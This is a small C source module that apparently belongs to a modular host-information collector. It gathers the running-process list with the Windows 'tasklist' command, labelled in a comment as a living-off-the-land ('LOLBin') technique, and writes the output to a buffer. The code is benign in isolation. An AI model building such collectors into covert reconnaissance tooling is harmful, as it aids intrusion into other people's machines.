// chunk: collectors/processes_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: collect_processes
// note: LOLBin process list via cmd /c tasklist — alternative to API-based processes.c

#ifndef CHUNK_PROCESSES_LOLBIN
#define CHUNK_PROCESSES_LOLBIN

static void collect_processes(void) {
    emitf("=== RUNNING PROCESSES ===\r\n");
    char buf[16384] = {0};
    DWORD buf_len = 0;
    run_cmd("cmd /c tasklist /fo csv /nh", buf, sizeof(buf), &buf_len);
    if (buf_len > 0) {
        char *line = buf;
        while (*line) {
            char *eol = strchr(line, '\n');
            if (!eol) eol = line + strlen(line);
            int ll = (int)(eol - line);
            while (ll > 0 && (line[ll-1] == '\r' || line[ll-1] == '\n')) ll--;
            if (ll > 0) emitf("  %.*s\r\n", ll, line);
            if (*eol) line = eol + 1; else break;
        }
    }
    emitf("\r\n");
}

#endif
